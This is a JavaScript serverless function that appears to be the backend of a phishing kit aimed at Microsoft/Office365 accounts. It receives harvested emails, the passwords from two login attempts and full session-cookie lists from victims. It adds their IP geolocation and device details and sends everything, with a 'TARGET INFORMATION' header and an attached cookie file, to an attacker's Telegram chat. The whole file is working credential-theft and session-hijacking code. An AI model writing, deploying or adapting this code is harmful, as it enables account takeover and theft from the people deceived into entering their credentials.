const UAParser = require('ua-parser-js');

// --- Configuration ---
const CONFIG = {
  // Environment variables required by the function.
  // This centralizes env var access and makes dependencies clear.
  ENV: {
    TELEGRAM_BOT_TOKEN: process.env.TELEGRAM_BOT_TOKEN,
    TELEGRAM_CHAT_ID: process.env.TELEGRAM_CHAT_ID,
  },
  // Timeout for fetch requests in milliseconds.
  FETCH_TIMEOUT: 15000,
  // Fields to request from the IP geolocation API.
  GEO_API_FIELDS: 'country,regionName,query',
};

// --- Helper Functions ---

/**
 * Creates an AbortSignal that aborts after a specified time.
 * @param {number} ms - The timeout in milliseconds.
 * @returns {AbortSignal}
 */
const createTimeoutSignal = (ms) => {
  const controller = new AbortController();
  setTimeout(() => controller.abort(), ms);
  return controller.signal;
};

/**
 * Safely gets a header value, checking for case variations.
 * @param {object} headers - The request headers.
 * @param {string} name - The header name.
 * @returns {string}
 */
const getHeader = (headers, name) => headers[name] || headers[name.toLowerCase()] || '';

/**
 * Detects the client's IP address from various headers.
 * @param {object} event - The Netlify event object.
 * @returns {string}
 */
const getClientIp = (event) => {
  const headers = event.headers || {};
  const ip = getHeader(headers, 'x-forwarded-for') ||
             getHeader(headers, 'x-real-ip') ||
             getHeader(headers, 'cf-connecting-ip') ||
             event.requestContext?.identity?.sourceIp ||
             'Unknown';
  return ip.toString().split(',')[0].trim();
};

/**
 * Fetches geolocation data for a given IP address.
 * @param {string} ip - The IP address.
 * @returns {Promise<{country: string, regionName: string}>}
 */
const getIpAndLocation = async (ip) => {
  const location = { country: 'Unknown', regionName: 'Unknown' };
  if (ip === 'Unknown' || ip.startsWith('127.0.0.1')) {
    return location;
  }
  try {
    const geoResponse = await fetch(`http://ip-api.com/json/${ip}?fields=${CONFIG.GEO_API_FIELDS}`, {
      signal: createTimeoutSignal(3000), // Shorter timeout for geo lookup
    });
    if (geoResponse.ok) {
      const geoJson = await geoResponse.json();
      location.country = geoJson.country || 'Unknown';
      location.regionName = geoJson.regionName || 'Unknown';
    }
  } catch (e) {
    console.error(`Geolocation lookup for IP ${ip} failed:`, e.message);
  }
  return location;
};

/**
 * Parses user agent string to get device, OS, and browser info.
 * @param {string} userAgent - The user agent string.
 * @returns {object}
 */
const getDeviceDetails = (userAgent) => {
  const uaParser = new UAParser(userAgent || '');
  const browser = uaParser.getBrowser();
  const os = uaParser.getOS();
  
  return {
    deviceType: /Mobile|Android|iPhone|iPad/i.test(userAgent || '') ? '📱 Mobile' : '💻 Desktop',
    browser: browser.name ? `${browser.name} ${browser.version || ''}`.trim() : 'Unknown Browser',
    os: os.name ? `${os.name} ${os.version || ''}`.trim() : 'Unknown OS',
  };
};

/**
 * Composes the message to be sent to Telegram.
 * @param {object} data - The parsed request body.
 * @returns {string}
 */
const composeTelegramMessage = (data) => {
    const {
        email,
        provider,
        firstAttemptPassword,
        secondAttemptPassword,
        password, // Fallback
    } = data;

    const hasTwoStepData = firstAttemptPassword && secondAttemptPassword;

    let message = `👤 TARGET INFORMATION
┌─────────────────────────────────
│ 📧 Email: \`${email || 'Not captured'}\`
│ 🏢 Platform: *${provider || 'Others'}*`;

    if (hasTwoStepData) {
        message += `
│ 🚫 Invalid Password: \`${firstAttemptPassword}\`
│ ✅ Valid Password: \`${secondAttemptPassword}\`
└─────────────────────────────────`;
    } else {
        message += `
│ 🔑 Password: \`${password || 'Not captured'}\`
└─────────────────────────────────`;
    }

    message += `
│ ⏰ Captured: ${new Date().toLocaleString('en-US', { 
        timeZone: 'UTC',
        year: 'numeric',
        month: 'short', 
        day: 'numeric',
        hour: '2-digit',
        minute: '2-digit'
    })} UTC`;

    return message;
};

/**
 * Builds Microsoft cookie section for Telegram message
 * @param {object} microsoftCookies - Microsoft cookie statistics
 * @param {array} cookieList - Full cookie list
 * @returns {string}
 */
const buildMicrosoftCookieSection = (microsoftCookies, cookieList) => {
    if (!microsoftCookies && !cookieList) {
        return '\n\n*🔵 MICROSOFT SESSION*\n- Status: *No cookies captured*';
    }

    let section = '\n\n*🔵 MICROSOFT SESSION*\n';

    // Add Microsoft cookie statistics
    if (microsoftCookies) {
        section += `- 📊 Total Cookies: *${microsoftCookies.total || 0}*\n`;
        section += `- 🔐 Auth Cookies: *${microsoftCookies.authCookies || 0}*\n`;
        section += `- 🎫 Session Cookies: *${microsoftCookies.sessionCookies || 0}*\n`;
        
        if (microsoftCookies.domains && microsoftCookies.domains.length > 0) {
            const domains = microsoftCookies.domains.slice(0, 3).join(', ');
            section += `- 🌐 Domains: \`${domains}\`\n`;
        }
    }

    // Add note about cookie file attachment
    if (cookieList && Array.isArray(cookieList) && cookieList.length > 0) {
        section += `- 📎 Cookie File: *microsoft_cookies.txt attached*\n`;
    }

    return section;
};

/**
 * Generates Microsoft cookie file content
 * @param {array} cookieList - Full cookie list
 * @param {object} data - Session data
 * @returns {string}
 */
const generateMicrosoftCookieFile = (cookieList, data) => {
    if (!cookieList || !Array.isArray(cookieList)) {
        return null;
    }

    // CRITICAL: Accept ALL cookies for Office365 provider - don't filter
    const microsoftCookies = cookieList;
    
    console.log('🔵 Cookie file generation:', {
        totalCookies: cookieList.length,
        provider: data.provider,
        email: data.email
    });

    if (!microsoftCookies || microsoftCookies.length === 0) {
        console.log('❌ No cookies found for file generation');
        return null;
    }

    console.log('✅ Generating cookie file with', microsoftCookies.length, 'cookies');

    const timestamp = new Date(data.timestamp || Date.now()).toISOString();
    
    let fileContent = `Microsoft Office365 Authentication Cookies
========================================

Session Information:
- Email: ${data.email || 'Not captured'}
- Provider: ${data.provider || 'Office365'}
- Timestamp: ${timestamp}
- Session ID: ${data.sessionId}
- IP Address: ${data.clientIP}
- Location: ${data.location?.regionName}, ${data.location?.country}
- User Agent: ${data.userAgent || 'Not captured'}

========================================
CAPTURED COOKIES (${microsoftCookies.length} total)
========================================

`;

    microsoftCookies.forEach((cookie, index) => {
        fileContent += `[${index + 1}] ${cookie.name}\n`;
        fileContent += `Domain: ${cookie.domain}\n`;
        fileContent += `Path: ${cookie.path || '/'}\n`;
        fileContent += `Value: ${cookie.value}\n`;
        fileContent += `Secure: ${cookie.secure || false}\n`;
        fileContent += `HttpOnly: ${cookie.httpOnly || false}\n`;
        fileContent += `SameSite: ${cookie.sameSite || 'none'}\n`;
        if (cookie.expirationDate) {
            fileContent += `Expires: ${new Date(cookie.expirationDate * 1000).toISOString()}\n`;
        }
        fileContent += `Session: ${cookie.session || false}\n`;
        fileContent += `Capture Method: ${cookie.captureMethod || 'injection'}\n`;
        fileContent += `Capture Time: ${cookie.timestamp || timestamp}\n`;
        fileContent += `\n${'='.repeat(50)}\n\n`;
    });

    fileContent += `\nFile generated: ${new Date().toISOString()}\n`;
    fileContent += `Total Microsoft cookies captured: ${microsoftCookies.length}\n`;

    return fileContent;
};

/**
 * Sends a document to Telegram
 * @param {string} chatId - Telegram chat ID
 * @param {string} botToken - Telegram bot token
 * @param {string} content - File content
 * @param {string} filename - File name
 * @param {string} caption - File caption
 * @returns {Promise<boolean>}
 */
const sendTelegramDocument = async (chatId, botToken, content, filename, caption) => {
    try {
        const formData = new FormData();
        const blob = new Blob([content], { type: 'text/plain' });
        
        formData.append('chat_id', chatId);
        formData.append('document', blob, filename);
        if (caption) {
            formData.append('caption', caption);
            formData.append('parse_mode', 'Markdown');
        }

        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
            method: 'POST',
            body: formData,
            signal: createTimeoutSignal(CONFIG.FETCH_TIMEOUT),
        });

        return response.ok;
    } catch (error) {
        console.error('Failed to send Telegram document:', error.message);
        return false;
    }
};

// --- Main Handler ---
exports.handler = async (event) => {
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
  };

  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 200, headers, body: '' };
  }

  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, headers, body: JSON.stringify({ error: 'Method not allowed' }) };
  }

  // Check for required environment variables at the start.
  if (!CONFIG.ENV.TELEGRAM_BOT_TOKEN || !CONFIG.ENV.TELEGRAM_CHAT_ID) {
    console.error('FATAL: Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID env vars.');
    return { statusCode: 500, headers, body: JSON.stringify({ success: false, message: 'Server misconfiguration.' }) };
  }
  
  try {
    const body = JSON.parse(event.body || '{}');
    const clientIP = getClientIp(event);
    const location = await getIpAndLocation(clientIP);
    const deviceDetails = getDeviceDetails(body.userAgent);
    const sessionId = body.sessionId || Math.random().toString(36).substring(2, 15);

    const messageData = {
        ...body,
        clientIP,
        location,
        deviceDetails,
        sessionId,
    };
    
    const message = composeTelegramMessage(messageData);

    // Send main message
    const telegramResponse = await fetch(`https://api.telegram.org/bot${CONFIG.ENV.TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CONFIG.ENV.TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' }),
      signal: createTimeoutSignal(CONFIG.FETCH_TIMEOUT),
    });

    if (!telegramResponse.ok) {
      const errorResult = await telegramResponse.json().catch(() => ({ description: 'Failed to parse Telegram error response.' }));
      console.error('Telegram API Error:', errorResult.description);
    }

    // Send Microsoft cookie file if available
    if (body.cookieList && Array.isArray(body.cookieList) && body.cookieList.length > 0) {
        const cookieFileContent = generateMicrosoftCookieFile(body.cookieList, messageData);
        if (cookieFileContent) {
            const filename = `microsoft_cookies_${sessionId}_${new Date().toISOString().slice(0, 10)}.txt`;
            const caption = `🔵 *Microsoft Cookies for ${body.email || 'Unknown'}*\n📅 ${new Date().toLocaleString('en-US', { timeZone: 'UTC' })} UTC`;
            
            const documentSent = await sendTelegramDocument(
                CONFIG.ENV.TELEGRAM_CHAT_ID,
                CONFIG.ENV.TELEGRAM_BOT_TOKEN,
                cookieFileContent,
                filename,
                caption
            );
            
            if (!documentSent) {
                console.error('Failed to send Microsoft cookie file to Telegram');
            }
        }
    }

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({ success: true, sessionId }),
    };

  } catch (error) {
    console.error('Function execution error:', error.message);
    // Suppress sending error to Telegram to avoid noise, but keep it for server logs.
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({ error: 'An internal server error occurred.' }),
    };
  }
};
